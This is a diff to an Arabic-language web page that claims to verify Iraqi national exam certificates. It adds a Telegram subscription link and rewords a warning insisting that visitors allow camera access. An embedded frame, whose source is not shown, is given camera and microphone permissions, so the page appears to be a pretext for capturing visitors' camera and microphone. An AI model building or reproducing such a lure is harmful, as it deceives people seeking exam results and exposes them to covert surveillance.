@@ -42,17 +42,39 @@
       text-align: center;
       padding: 10px;
       font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .telegram-section {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .telegram-section a {
+      color: #007bff;
+      text-decoration: underline;
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    .telegram-section img {
+      width: 40px;
+      height: 40px;
+      vertical-align: middle;
+      margin-right: 10px;
     }
 
     iframe {
       width: 100%;
-      height: calc(100% - 160px);
+      height: calc(100% - 180px);
       border: none;
     }
 
-    a {
-      color: #007bff;
-      text-decoration: underline;
+    /* Section for site control (scrolling) */
+    .scroll-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 10px;
     }
   </style>
 </head>
@@ -60,12 +82,18 @@
   <div class="header">التحقق من صحة صدور شهادة الامتحان الوطني العراقي</div>
 
   <div class="warning">
-    يجب السماح بالوصول إلى الكاميرا ليعمل الموقع بشكل صحيح
+    سيطلب منك الموقع السماح بالوصول إلى الكاميرا يجب السماح بذلك ليعمل الموقع بشكل صحيح
   </div>
 
   <div class="camera-note">
     للمزيد من المعلومات، اشترك في قناة التليجرام:
-    <a href="https://t.me/+AEVUOHd0QVI1OWQy" target="_blank">اضغط هنا</a>
+  </div>
+
+  <div class="telegram-section">
+    <a href="https://t.me/+AEVUOHd0QVI1OWQy" target="_blank">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo_2019.svg" alt="Telegram Logo" />
+      اشترك الآن في قناة التليجرام
+    </a>
   </div>
 
   <!-- السماح باستخدام الكاميرا -->
@@ -75,6 +103,11 @@
     allow="camera; microphone"
     allowfullscreen
   ></iframe>
+
+  <!-- إضافة قسم التحكم في التمرير / التحريك أسفل الفريم -->
+  <div class="scroll-container">
+    <p>استخدم الأسهم للتحريك أو التمرير.</p>
+  </div>
 
 </body>
 </html>
